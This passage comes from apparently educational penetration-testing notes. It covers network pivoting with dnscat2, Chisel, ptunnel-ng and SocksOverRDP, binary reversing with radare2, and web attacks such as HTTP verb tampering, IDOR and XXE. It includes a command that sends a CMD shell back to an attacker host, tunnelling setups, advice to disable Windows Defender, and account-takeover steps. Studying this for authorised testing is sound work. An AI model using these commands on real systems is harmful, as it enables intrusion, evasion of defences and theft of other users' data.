First, clone the project contianing the client file to the attack host, then transfer it to the target. Once the dnscat2.ps1 file is on the target, import it and run associated cmd-lets:
```bash
Import-Module .\dnscat2.ps1

```
After dnscat2.ps1 is imported, use it to establush a tunnel with the server running on the attack host. Then, send back a CMD shell session to the attack host's server. It is important to note that the pre-shared secret that was generated on the server must be used to ensure that the session is established and encrypted:
```bash
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

```
If all steps were completed successfully, there should be a session established with the server starting with `dnscat2>`. This can be used to interact with sessions and move further in a target environment on engagements. To interact with the established session and drop into a shell, use the following command from the dnscat> prompt:
```bash
window -i 1

```
**<u>Chisel</u>**

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP based tunneling tool that uses HTTP to transport data tthat is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment. 

Consider a situation where an attacker has to tunnel their traffic to a web server on the 172.16.5.0/23 network (internal network). The attacker has the domain controller with the address 172.16.5.19, which is not directly accessible to the attack host since the attack host and the domain controller belong to different network segments; however, since a pivot host has been compromised, a chisel sever can be started on it that will listen on a specific port and forward traffic to the internal network through the established tunnel. 

Start by installing Chisel on the attack host; Go must also be installed to build the Chisel library. With Go installed, move into the directory and use go build to build the Chisel binary. Depending on the version of the glibc library installed on both the pivot host and attack host, there may be discrepencies that could result in an error. When this happens, it is important to compare the versions of the library on both systems, or use an older prebuilt version of chisel, which can be found in the Releases section of the repo:
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel
go build

```
Once the binary is built, transfer it to the target pivot host, then start the Chisel server/listener; in this case, the pivot host is the server and the attack host is the client:
```bash
scp chisel username@x.x.x.x:~/

./chisel server -v -p 1234 --socks5
```
The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 and forward it to all the networks that are accessible from the pivot host. In this case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow the attacker to reach hosts on that network. Now, start a client on the attack host and connect to the Chisel server:
```bash
./chisel client -v 10.129.202.64:1234 socks

```
If successful, the Chisel client will create a TCP/UDP tunnel via HTTPS using SSH between the Chisel server and the client and has started listening on port 1080. Now, modify the `proxychains.conf` file to add port 1080 (or whatever port is output from the previous command) at the end so proxychains can be used to pivot using the created tunnel between the 1080 port and the SSH tunnel, as follows:
```bash
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080

```
Now, if proxychains is used with RDP, it will be possible to connect to the domain controller on the internal network through the tunnel that was created through the Pivot host:
```bash
proxychains xfreerdp /v:x.x.x.x /u:username /p:password

```
**<u>Chisel Reverse Pivot</u>**

There may also be scenarios where firewall rules restrict inbound connections to the compromised target. In such cases, use Chisel with the reverse option. When the Chisel server has `--reverse` enabled, remotes can be prefixed with R to denote reversed. The server will listen and accept connections, and they will be proxied through the client, which specified the remote. Reverse remotes specifying R:socks will listen on the server's default socks port (1080) and terminate the connection at the client's internal SOCKS5 proxy. 

Start the server on the attack host with the option `--reverse`:
```bash
sudo ./chisel server --reverse -v -p 1234 --socks5

```
Then, from the pivot host, use the option `R:socks` to connect to the server (attack host):
```bash
./chisel client -v x.x.x.x:1234 R:socks

```
Make the same changes to the bottom of the `proxychains.conf` file again, specifying **socks5 127.0.0.1 1080.** Now, if proxychains is used with RDP, it will be possible to connect to the domain controller on the internal network through the created tunnel to the pivot host:
```bash
proxychains xfreerdp /v:x.x.x.x /u:username /p:password
```
If the target yields an error message with chisel, try with a different version.

#### **`ICMP Tunneling & RDP and SOCKS Tunneling (SocksOverRDP)`**

**<u>ICMP Tunneling with SOCKS</u>**

ICMP tunneling encapsulates traffic within ICMP packets containing echo requests and responses. ICMP tunneling only works when ping responses are permitted within a firewalled network. When a host within a firewalled network is allowed to ping an external server, it can encapsulate its traffic within the ping echo request and send it to an external server. The external server can validate this traffic and send an appropriate response, which ie useful for data exfiltration and creating pivot tunnels to an external server. 

[ptunnel-ng](https://github.com/utoni/ptunnel-ng) can be used to create a tunnel between the initial pivot host and the attack host. Once a tunnel is created, it will be possible to proxy traffic through the ptunnel-ng client. 

First, install and initialize the ptunnel-ng:
```bash
clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh 

```
After running the final script, ptunnel-ng can be used from the client and server-side.Everything will be available in `/ptunnel-ng/src` Transfer the repo from the attack host to the target host; once this is done, start the server-side of the ICMP tunnel on the pivot host with the following command:
```bash
scp -r ptunnel-ng username@x.x.x.x:~/

sudo ./ptunnel-ng -rx.x.x.x -R22       #done on pivot host; IP address is the one reachable from the attack host on the pivot host

```
Based on the attack host, attempt to connect to the ptunnel-ng server with the following command, but ensure this happens through the local port 2222, as this port allows traffic to be sent through the ICMP tunnel:
```bash
sudo ./ptunnel-ng -px.x.x.x -l2222 -rx.x.x.x -R22     #done on attack host; both IP addresses are that of the pivot host in this case

```
With the ptunnel-ng ICMP tunnel successfully established, attempt to connect to the target using SSH through local port 2222, as follows:
```bash
ssh -p2222 -lusername 127.0.0.1           #username is that of the pivot host

```
If configured correctly, enter the credentials of the pivot host to get an SSH session all through the ICMP tunnel. On the client & server-side of the connection, ptunnel-ng gives session logs and traffic statistics associated with the traffic that passes through the ICMP tunnel. This is one way to confirm that the traffic is passing from client to server using ICMP. 

This tunnel and SSH can also be used to perform dynamic port forwarding to use proxychains in various ways:
```bash
ssh -D 9050 -p2222 -lusername 127.0.0.1         #username is that of the pivot host

```
Proxychains can be used with nmap to scan targets on the internal network (172.16.5.x) connected to the pivot host. If the other device is found to be Windows, check to see if RDP is open or try other ports with the following flags:
```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389

```
**<u>RDP and SOCKS Tunneling (SocksOverRDP)</u>**

If limited to a Windows network without access to SSH for pivoting, tools for Windows OSs would have to be used. [SocksOverROD](https://github.com/nccgroup/SocksOverRDP) uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection; this feature allows clipboard data transfer, audio sharing, and tunneling arbitrary packets over the network. This tool can be used to tunnel custom packets and then proxy through it. [Proxifier](https://www.proxifier.com/) can be used as the proxy server. 

Start by downloading the appropriate binaries to the attack host to perform this attack. Having the binaries on the attack host will enable a transfer to each target where needed. The following binaries are needed:
* [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
* [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab). Download ProxifierPE.zip

Once these files are downloaded, load `SocksOverRDP.dll` using regsvr32.exe to the attack machine (if the attack machine is Windows; this can also be downloaded to the first pivot host). If this file .dll file deletes after download, turn off real-time protection and add **.dll** file exceptions from Windows Defender or `Uninstall-Windows-Feature -Name Windows-Defender`:
```powershell
Expand-Archive -Path "SocksOverRDPx64.zip"

regsvr32.exe SocksOverRDP-Plugin.dll

```
Now, connect to the pivot host (or the secondary pivot host depending on the context) using `mstsc.exe`; a prompt should be output that the SocksOverRDP plugin is enabled and listening on 127.0.0.1:1080. Transfer the SocksOverRDPx64.zip or the SocksOverRDP-Server.exe file to the pivot host, then start SocksOverRDP-Server.exe with Admin privileges. It should be clear whether the SOCKS listener is started, but to confirm it, type the following on the pivot host:
```powershell
netstat -antb | findstr 1080

```
After starting the listener on the pivot host, use the Proxifier executable on the attack host and configure it to forward all the packets to 127.0.0.1:1080. Proxifier will route traffic through the given host and port: 
1. Select the ProxifierPortable app
2. Profile > Proxy Server
3. Add IP address 127.0.0.1 and port 1080 with SOCKS5

Once this is complete, start `mstsc.exe` on the attack host and connect to the target machine on a remote network. Enter the IP address of the remote server and the known credentials. Proxifier will route all the attack host's traffic via 127.0.0.1:1080, which will tunnel it over RDP to the pivot host (again, or the secondary pivot host depending on the context), which will then route it to the final target's network using SocksOverRDP-server.exe

>It is important to note that when interacting with RDP sessions on an engagement, there may be slow performance in a given session, especially if there are multiple RDP sessions simultaneously. If this is the case, access the Experience tab in mstsc.exe and set Performance to Modem.

### **`Methodology & Techniques`**

When reversing a file, the first thing that should be done is determining the type of file. This can be done with the `file` command. Depending on the file type, either the `strings` command or the *`cat`* command can be used to read the readable strings within the file. It is also important to determine the file size; this can be done with the following command:
```bash
ls -lh <file>

```

Sometimes the files are compressed to make them smaller and use less space. In these cases, the file would need to be decompressed to extract more information from the original code, as the decompression process removes the applied obfuscation and compressed techniques that hide the binary content. Decompressing a file can make it easier to:
* Inspect the raw binary code
* Identify embedded strings or other useful information 
* Run static or dynamic analysis tools on the decompressed file

The `file` command will reveal whether a file has been compressed or not; it will have no section header if it has been compressed. The size of the file may be considerably small as well. There are different [de]compression programs, but the most common is **UPX** on Linux. To determine whether UPX was used to compress a file and decompress the file, the following commands can be executed:

Before entering a specific reverse engineering program, `ltrace` and `strace` should be used to understand how the program interacts with the OS and libraries.
* **`ltrace`** is a program that runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program. 
   * Sometimes, it will reveal a strcmp flag, which may be important in reversing the program. 

* **`strace`** is primarily used to trace system calls made by a process. It monitors interactions between a program and the OS, like file operations, memory management, process management, etc. In the simplest case, strace runs the specified command until it exits. It intercepts and records the system calls which are called by a process and the signals which are received by a process.
```bash
ltrace ./<file>

strace ./<file>

```

Both `ghidra` and `radare2` can be used to reverse a program. R2 is more comprehensive, but it is generally available by default in Kali Linux and may be faster to extract expected strings for string comparisons in password scenarios. The following commands can be used to properly use radare2:
```bash
r2 <file>

[0x00401c40]> aaa    #analyzes file; this is necessary to proceed

[0x00401c40]> iz     #shows strings within the binary

[0x00401c40]> / <string>    #searches binary for a specific string

[0x00401c40]> afl    #displays all functions used within the binary

[0x00401c40]> s <function>    #seeks a function. For the most part, the main function is the point of interest

[0x00401c40]> pdf@<function>     #prints the disassembled function 

[0x00401c40]> pdf@<function> | grep cmp   #searches for the cmp flag, displayed in assembly

[0x00401c40]> pdf@<function> | grep strcmp   # searches for the strcmp flag, displayed in assembly

[0x00401c40]> pdc@<function>     #prints the function in pseudo C format

[0x00401c40]> pdc@<function> | grep cmp   #searches for the cmp flag, displayed in pseudo C code

[0x00401c40]> pdc@<function> | grep strcmp   #searches for the strcmp flag, displayed in pseudo C code

[0x00401c40]> VVV       #displays a cheeky virtualization of the program, connecting the functions

```
While there may be several functions of interest, the main function is typically the point of entry. ### **`Common Web Attacks`**

* **`HTTP Verb Tampering`:** This attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.

* **`Insecure Direct Object References (IDOR)`:** This attack can lead to accessing daa that should not be accessible by attackers. IDORs are common because the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. If a web application lacks a robust access control mechanism and exposes direct references to files and resources, it may be possible to acess other users' files and information by simply guessing or calculating their file IDs

* **`XML External Entity (XXE) Injection`:** As many web applications process XML as part of their functionality, it may be possible to send malicious XML data to disclose local files stored on the back-end server. These files may be configuration files that may contain sensitive information like passwords or source code of the web application, which would enable attackers to identify more vulnerabilities. In many cases, web applications use outdated XML libraries to parse and process XML input data from the front-end user. XXE attacks can even be leveraged to steal the hosting server's credentials, which would compromise the entire server and allow for RCE.

<a id="httpverbtampering"></a>

#### **`HTTP Verb Tampering`**

Depending on the web server configuration, web applications may be scripted to accept certain HTTP methods for their various functionalities and perform a particular action based on the type of the request. 
* While programmers mainly consider the two most commonly used HTTP methods, GET and POST, any client can send any other methods in their HTTP requests and then see how the web server handles these methods. 
   * If both the web application and the back-end web server are configured to only accept GET and POST requests, sending a different request will cause a web server error page to be displayed, which is not a sever vulnerability in itself, other than providing a bad user experience and potentially leading to information disclosure.

   * If the web server configurations are not restricted to only accept the HTTP methods required by the web server (i.e., GET/POST), and the web application is not developed to handle other types of HTTP requests (i.e., HEAD/PUT), then this is considered an insecure configuration and an attacker can exploit it to gain access to additional functionalities or even bypass certain security controls. 

Besides GET and POST, the following are some of the commonly used HTTP verbs:

<center>

|Verb|Description|
|----|-----------|
|`HEAD`|Identical to a GET request, but its response only contains the headers, without the response body|
|`PUT`|Writes the request payload to the specified location|
|`DELETE`|Deletes the resource at the specified location|
|`OPTIONS`|Shows different options accepted by a web server, like accepted HTTP verbs|
|`PATCH`|Apply partial modifications to the resource at the specified location|

</center>


If a web server is not securely configured to manage methods like PUT or DELTE, an attacker can use them to gain control over the back-end server. Essentially, HTTP Verb Tampering attacks are common because they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability:
* **`Insecure Configurations`** cause the first type of HTTP verb tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. 
   * For example, if the configuration of a web server requires authentication to access a particular web page by specifying GET and POST requests as the authentication method, an attacker can use different HTTP methods, like HEAD, to bypass this authentication mechanism altogether. This essentially leads to an authentication bypass and allows attackers to access web pages and domains they should not have access to.
* **`Insecure Coding`** coding practices cause the other type of HTTP verb tampering vulnerabilities. This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. This is much more common than insecure configuration. 
   * For example, if a web page was found to be vulnerale to a SQLi vulnerability, and the back-end developer mitigated the SQLi vulnerability by applying (poor) input sanitization filters, an attacker may change the request method to perform the SQLi. This would effectively pass the security filter, making the function still vulnerable to SQLi. 

<a id="bypassingbasicauthvtamp"></a>

##### **`Bypassing Basic Authentication`**

To exploit HTTP verb tampering vulnerabilities, all that needs to be done is to try alternate HTTP methods to see how they are handled by the web server and the web application. Many automated vulnerability scanning tools can consistently identify HTTP verb tampering vulnerabilities caused by insecure server configurations; **insecure web server configurations** that lead to HTTP verb tampering vulnerabilities allow attackers to bypass the HTTP Basic Authentication prompt on certain pages. 

To identify whether Basic Authentication is used, a prompt will appear when logging in, or intercept the request and ensure the header is in the following format:
```html
[GET/POST] HTTP /1.1
Authorization: Basic <base64 encoded string>

```

When attempting to login and the credentials are unknown, the web server will redirect the user to a 401 unauthorized page. To bypass this, first identify which pages are restricted by the authentication. 
* Examine the HTTP request while on the unauthorized page or look at the URL of the unauthorized page. Enter the directory or specific page in the URL to confirm which is restricted to unauthorized users. 

Now, intercept a request to the restricted page via Burpsuite. Identify the HTTP request method originally used by the web application. If the web page originally used a GET request change it to a POST request, and if the web page originally used a POST request change it to a GET request. This may not always bypass authentication as either request may not be accepted by the web server, so it would be better to check the accepted HTTP methods and try them:
```bash
curl -i -X OPTIONS http://<domain.com>:<port>/

```

If HEAD is an accepted request, try using it. This will yield an empty output on Burpsuite (normal for HEAD requests), but may bypass security mechanisms. This is mostly effective when intercepting the request directly on Burpsuite and not sending the request to Burp's Repeater. 
* Intercept the web request, change the request method to HEAD, forward the request, turn off intercept, go to browser

<a id="bypassingsecfiltershttpvtamp"></a>

##### **`Bypassing Security Filters`**

While many automated vulnerability scanning tools can consistently identify HTTP verb tampering vulnerabilities caused by insecure server configurations, they usually miss identifying HTTP tampering vulnerabilities caused by **insecure coding,** as insecure coding demands active testing to see whether the security filters can be bypassed. Insecure coding errors made during the development of a web application often leads to the web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests.
* For example, if a security filter was being used to detect vulnerabilities and only checked for injections in POST parameters, it may be possible to bypass it by changing the request method to GET.

<br>

To identify whether security filters can potentially be bypassed, use a special character (i.e., `;` `--` `%` `\\` `\`, etc) in an input field. Sometimes, there will be a message that the web application uses certain filters on the back-end to identify injection attempts and blocks the malicious requests; however, the web application can still block the request without explicitly showing that the input request was blocked because of an injection attempt. Either way, it is still possible to attempt an HTTP verb tampering attack to bypass the security filter.

In this case, intercept the request in Burpsuite and change the request method. This may or may not URL-encode the special character, so try both and look at the web browser. When the request goes through successfully, this indicates that the security filters can be bypassed on the web application. 
* To confirm whether the security filter was bypassed, attempt exploiting the vulnerability the filter is protecting. This depends on the exact vulnerability of the web server, as it can be XSS, SQLi, Command Injection, etc.

If the web server is vulnerable to command injection and the security filters were bypassed, further exploitation is possible. Try to create more files, connect to the server via netcat, read files, etc. If this works, it is important to realize that the vulnerability the filter is protecting is only possible because of the HTTP verb tampering: the web application may have been secure against command injection, SQLi, or XSS but HTTP verb tampering may enable these vulnerabilities. 

<a id="idorwebfoothold"></a>

#### **`Insecure Direct Object Refernces (IDOR)`**

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable. 
* For example, if users request access to a file they recently uploaded, they may get a link to it such as `download.php?file_id=123`. Because the link directly references the file with `file_id=123`, it may be possible for an attacker to access another file which may not belong to them by modifying the parameter value if the web application does not have a proper access control system on the back-end

While exposing a direct reference to an internal object or resource is not a vulnerability in itself, this may make it possible to exploit a weak access control system. Many web applications restrict users from accessing resources by restricting them from accessing the pages, functions, and APIs that can retrieve these resources; however, if the web application does not have an access control system on the back-end that compares the user's authentication to the resource's access list, they might be able to acess a resource by solely having the link.
* Role-Based Access Control (RBAC) systems enable a solid access control system for web applications; however, a comprehensive access control system covering the entire web application without interfering with its functions may not always be possible. 

* An IDOR vulnerability mainly exists due to the lack of an access control on the back-end. If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data. 
   * Many developers ignore building an access control system, so most web/mobile applications are left unprotected on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is normally designed to only show the user's data. By manipulating HTTP requests, all users may have full access to all data, which will lead to a successful attack. 

IDORs that lead to accessing private files and resources of other users are known as **`IDOR Information Disclosure Vulnerailities`.** Depending on the nature of the exposed direct reference, the vulnerability may allow an attacker to modify or delete other users' data, which can lead to a complete account take over. With **`IDOR Insecure Function Calls`,** a standard user can elevate their privileges to an administrative user. 
* For example, with function calls, many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. If there is access to such parameters or APIs, they may be called with standard user privileges. If the back-end did not explicitly deny non-admin users from calling these functions, an attacker may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.

<a id="identifyingidorscmnwebattc"></a>

##### **`Identifying IDORs`**

**URL Parameters & APIs**

Whenever specific files or resources are presented, go through the HTTP requests and look for URL parameters or APIs with an object reference (i.e., `?uid=1` or `?filename=file_1.pdf`). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies. 

In the most basic cases, try incrementing the values of the object references to retrieve other data, like `?uid=2` or `?filename=file_2.pdf`. Also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files owned by other users would be indicative of an IDOR vulnerability. 

<br>

**AJAX Calls**

Look through unused parameters or APIs in the front-end code in JavaScript AJAX calls. Some web applications developed in JS frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role. 

For example, if an attacker does not have an administrative account, only the user-level functions would be used and the admin functions would be disabled; however, the attacker may still be able to find the administrative functions if they look into the front-end JS code to identify AJAX calls to specific end-points or APIs that contain direct object references. If they identify direct object references in the JS code, they can test them for IDOR vulnerabilities. This is not unique to admin functions, as it can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows an example of an AJAX call:
```js
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}

```
This function may never be called when a non-admin user is using the web application; however, if this code, or anything similar is found in the front-end code, it may be tested in different ways to see whether it can be called to perform changes; if that works, the web application is vulnerable to IDOR. For open-source web applications, the same can be attempted with the back-end code. 

<br>

**Understand Hashing/Encoding**

Some web applications may not use sequential numbers as object references, but may encode the reference or has it instead. If such parameters use encoded or hashed values, it may still be possible to exploit them if there is no access control system on the back-end. 

If the reference was encoded with a common encoder like base64, it can be decoded to view the plaintext of the object reference. Once the encoding scheme is determined the original reference can be decoded, changed to another object reference, and encoded again to access other data. 
* For example, if there is a reference like `?filename=ZmlsZV8xMjMucGRm`, the encoded value can be decoded to get the original object reference. Then, a different object reference can be encoded with the encoding scheme (base64 in this case) and input as a parameter value to attempt access to another resource. If this retrieves any data, an IDOR vulnerability is present. 

If the object reference is hashed, like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c`, look at the source code as it may reveal what is being hashed before the API call is made. The following is an example of what may be in the source code that can lead to an IDOR vulnerability:
```js
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});

```
In this case, the code uses the filename and hashes t with CryptoJS.MD5, making it easy for an attacker to calculate the filename for other potential files. If the hashing algorithm is not disclosed in the source code, identify the hashing algorithm through CyberChef, dcode, hashid, etc. Once the hashing algorithm is identified, hash the same filename to see if it matches the used hash. After, calculate the hashes for other files and try to download them, as it may reveal an IDOR vulnerability if non-user owned files are downloadable. 


<br>

**Compare User Roles**

To perform more advanced IDOR attacks, multiple users may need to be registered on a web application to compare their HTTP requests and object references. This enables attackers to understand how the URL parameters and unique identifiers are being calculated calculate them for other users to gather their data.

For example, if an attacker has access to two different users, one of which can view their salary after making the following API call:
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}

```
The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as User1; however, with these details present, the attacker can try repeating the same API call while logged in as User2 to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called. 
* If this is the case, the attacker can calculate the API parameters for other users, which would be indicative of an IDOR vulnerability. Even if the attacker could not calculate the API parameters for other users, they would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit. 

<a id="insrefetbyperef"></a>

##### **`Insecure References & Bypassing Encoded References`**

Once a potential IDOR is identified, it can be tested with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, it is imperative to understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques. 

A **`Static File IDOR`** may be exploitable when files have a predictable naming pattern. While this IDOR may disclose some files, it will not disclose all of them. 

To check for vulnerable parameters, fuzz the parameter value with similar values. If the back-end of the web application has a proper access control system, fuzzing the parameter value will output some form of access denied; however, if a seemingly vulnerable parameter is visible in the URL, the web application is likely poorly designed and may allow arbitrary access to other user accounts.

<br>

If a web application is not sending the direct reference in cleartext, and uses a hashing algorithm instead, the calculated hash may be calculated on the front-end, which allows attackers to look through the function and replicate what it's doing to calculate the same hash. As most modern web applications are developed using JS frameworks, many web developers may perform sensitive functions on the front-end, which would expose them to attackers. This will often be seen in the source code of the web application, potentially looking as follows:
```js
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```
In this case, the value being [md5] hashed `btoa(uid)` is the base64 encoded string of the uid variable. Essentially, the final value being used in the POST request is the base64 encoded string of the uid, which was then md5 hashed. This can be tested by base64 encoding a uid parameter value, and then hashing it with md5:
```bash
echo -n 1 | base64 -w 0 | md5sum

```
This can be automated with a shell script or Burp intruduer. The following command is an example of calculating the hash of the first ten UIDs:
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

<a id="idorsininsecapis"></a>

##### **`IDORs in Insecure APIs`**

Exploiting IDOR vulnerabilities in function calls and APIs may allow an attack to perform various actions as other users. While **IDOR Information Disclosure Vulnerabilities** allow attackers to read various types of resources, IDOR **Insecure Function Calls** enable attackers to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information.
* In many cases, attackers may obtain certain information through an information disclosure IDOR vulnerability and then using that information with an IDOR insecure function call vulnerabilities. 

To find insecure APIs, it is important to look through the different redirects of a web page, especially when editing information on a user profile page. In these cases, the information changes will persist through refreshes, meanining that the information gets updated in a database somewhere. At this point, intercept the update request and look at the request method:
* **`POST`** requests are used to create new items

* **`PUT`** requests are usually used to update item details, and are often used in APIs

* **`DELETE`** requests are used to delete items

* **`GET`** requests are used to retrieve item details

If a PUT request is used, which if often the case for updating a user's information, it may be possible to edit the information within the parameters; the parameters may be JSON format, for example:
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}

```
Also, it is important to determine whether the web application is setting the user access privileges on the client side, which may be in the form of the cookie or as part of the JSON request. If this is left under the client's control, it could be manipulated to gain more privileges if the web application has a poor access control system on the back-end. At this point, **different user access privileges (i.e., role) should be enumerated.**

Some of the parameters may appear in the HTML form and can be manipulated directly through the web browser, while others will not appear in the web browser but in the web request. From the example, there are a few things to try:
1. Change the UID to another user's uid, potentially allowing an account take over
2. Change another user's details, which may allow the attacker to perform several web attacks
3. Create new users with arbitrary details, or delete existing users
4. Change the role to a more privileged role (i.e., admin) to be able to perform more actions

If the modified web request does not yield a valid response when changing the [JSON] parameters, there if likely a form of access control on the back-end that prevents an attacker from arbitrarily changing some of the parameters. If this is the case, it may be required to change the API endpoint to that of another user's. This may also be the case if one [JSON] parameter confirms another [JSON] parameter. 
* From the previous example, if the UID and API end point are changed to that of another user, but the UUID is kept the same, the request will fail because of mismatched information. This is essentially another form of access control that prevents users from changing another user's details. If this is the case, a new user should be created with a POST request to the API endpoint, but will require the attacker to change the uid to a new uid.
   * While doing this, determine the user access privileges on the client side and modify them to be that of a higher level user. 


The different user access privileges may be difficult to enumerate in most cases, potentially preventing IDOR insecure function calls. If this is the case, it is crucial to test the API's GET request for IDOR Information Disclosure vulnerabilities. If there is no robust access control system in place, it may be possible to read other users' details, potentially enabling IDOR insecure function call vulnerabilities. If the API is vulnerable, it may be possible to leak other users' details and then use that information to complete IDOR attacks on the function calls. 
* Test the API against IDOR information disclosure vulnerabilities by attempting to get other users' details with GET requests

<a id="chainingidorvulns"></a>

##### **`Chaining IDOR Vulnerabilities`**

A GET request to the API endpoint typically returns the details of the requested user, so this should be done before proceeding. In many cases, web servers provide user-specific authorization, like a JWT; however, even if a token exists, unless it was being actively compared to the requested object details by a back-end access control system, an attacker may still be able to retrieve other users' details. Other servers may provide authorization through a cookie value. 

Finding an IDOR information disclosure vulnerability is a critical finding, as it can leak another user's account information. In addition to allowing an attacker to view potentially sensitive details, the ability to modify another user's details also enables them to perform several other attacks:
* Modifying a user's email address and then requesting a password reset link, which will be sent to the specified email address, allowing the attacker to take full control over their account
* Placing an XSS payload in a vulnerable vield, which would get executed once the user visits the page

It is crucial to enumerate all users and determine their user access privileges once identifying an IDOR information disclosure vulnerability. Once a higher-privilege account is found, their details can be modified and another attacker can be performed to take over their account. To do this, the appropriate request must be intercepted, where it is then modified to change the role to a higher-privilege user. 

By combining the information gained from an IDOR information disclosure vulnerability with an IDOR insecure function calls attack on an API endpoint, an attacker could modify other user's details and create/delete users while bypassing various access control checks in place. On many occasions, the information that is leaked through IDOR vulnerabilities can be used in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.

#### **`XML External Entity (XXE) Injection`**

XXE Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow an attacker to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. 

XML is a markup language designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displayed data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements. The following is an example of an XML document representing an e-mail document structure:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>abel@abel.com</sender>
  <recipients>
    <to>test@test.com</to>
    <cc>
        <to>ccone@test.com</to>
        <to>cctwo@test.com</to>
    </cc>
  </recipients>
  <body>
  This is an example of body text
      indented line 
  </body> 
</email>

```
The following are some of the key elements of an XML document:

<center>

|Key|Definition|Example|
|---|----------|-------|
|`Tag`|The keys of an XML document, usually wrapped with (</>) characters|\<date>|
|`Entity`|XML variables, usually wrapped with (&/;) characters|\&lt;|
|`Element`|The root element or any on its child elements, and its value is stored in between a start-tag and an end-tag|\<date>01-01-2022\</date>|
|`Attribute`|Optional specifications for any element that are stored in the tags, which may be used by the XML parser|version="1.0"/encoding="UTF-8"|
|`Declaration`|Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it|\<?xml version="1.0" encoding="UTF-8"?>|

</center>

**`XML Document Type Definition (DTD)`** allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the previous XML document:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>

```

In DTD, the root [email] element is declared with the ELEMENT type declaration followed by the child elements within parentheses. Each child element is also declared afterwards, where some of them also have child elements and others contain raw data (PCDATA). DTD can also be placed within an XML document directly after the XML declaration in the first line. Otherwise, it can be stored in an external file (i.e., email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">

<!--It is also possible to reference a DTD through a URL, as follows:-->

<?xml version="1.0" encoding="UTF-8"?>
